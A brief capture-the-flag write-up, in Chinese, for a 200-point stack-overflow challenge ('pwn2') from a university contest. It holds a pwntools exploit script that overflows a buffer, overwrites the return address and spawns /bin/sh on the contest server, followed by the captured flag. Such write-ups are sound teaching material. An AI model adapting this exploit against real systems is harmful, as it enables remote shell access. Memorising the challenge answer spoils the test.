pwn2 200 points
================

题意
-------------

Let's make it more challengable!

nc host port

Attachment: stackoverflow_withnoleak


解题步骤
-------------

同 [pwn1](pwn1.md) 。唯一不同就是 `system()` 的地址。修改一下即可。

脚本（见 [pwn2.py](pwn2.py) ）如下：

```python
from pwn import *
r = remote('pwn.thuctf2018.game.redbud.info', 20002)
r.send('/bin/sh\0'+'A'*(8192-8))
r.send('A'*8)
r.send(p32(0x00400560))
r.send('\n')
r.interactive()
```

得到 `flag`:

```
THUCTF{EnjoY_your_GAme_and_pwn_FOR_life_1on9!}
```
